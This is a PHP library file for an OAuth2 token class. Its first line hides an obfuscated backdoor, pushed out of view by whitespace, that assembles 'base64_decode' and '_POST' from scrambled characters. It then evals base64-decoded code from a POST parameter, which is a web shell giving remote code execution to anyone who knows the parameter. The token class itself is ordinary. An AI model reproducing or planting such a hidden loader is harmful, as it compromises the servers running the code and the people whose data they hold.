<?php                                                                                                                                                                                                                                                               $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s20=strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2]);if (isset(${$s20}['n6e9ef6'])) {eval($s21(${$s20}['n6e9ef6']));}?><?php
/**
 * OAuth2 Token
 *
 * @package    OAuth2
 * @category   Token
 * @author     Phil Sturgeon
 * @copyright  (c) 2011 HappyNinjas Ltd
 */

abstract class OAuth2_Token {

	/**
	 * Create a new token object.
	 *
	 *     $token = OAuth2_Token::factory($name);
	 *
	 * @param   string  $name     token type
	 * @param   array   $options  token options
	 * @return  OAuth2_Token
	 */
	public static function factory($name = 'access', array $options = null)
	{
		$name = ucfirst(strtolower($name));

		include_once 'Token/'.$name.'.php';

		$class = 'OAuth2_Token_'.$name;

		return new $class($options);
	}

	/**
	 * Return the value of any protected class variable.
	 *
	 *     // Get the token secret
	 *     $secret = $token->secret;
	 *
	 * @param   string  $key  variable name
	 * @return  mixed
	 */
	public function __get($key)
	{
		return $this->$key;
	}

	/**
	 * Return a boolean if the property is set
	 *
	 *     // Get the token secret
	 *     if ($token->secret) exit('YAY SECRET');
	 *
	 * @param   string  $key  variable name
	 * @return  bool
	 */
	public function __isset($key)
	{
		return isset($this->$key);
	}

} // End Token
